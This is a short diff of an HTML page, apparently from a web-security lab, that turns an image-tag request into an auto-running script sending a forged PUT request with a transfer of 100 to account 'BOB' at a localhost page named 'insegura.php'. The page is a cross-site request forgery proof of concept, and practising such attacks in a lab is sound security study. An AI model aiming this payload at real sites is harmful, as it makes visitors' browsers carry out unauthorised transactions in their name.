@@ -1,5 +1,13 @@
 <html>
 <body>
-<img src="http://localhost/jefferson/insegura.php" />
-</body>
+<script>
+function put() {
+    var x = new XMLHttpRequest();
+    x.open("PUT","http://localhost/jefferson/insegura.php",true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
+}
+</script>
+
+<body onload="put()">
 </html>
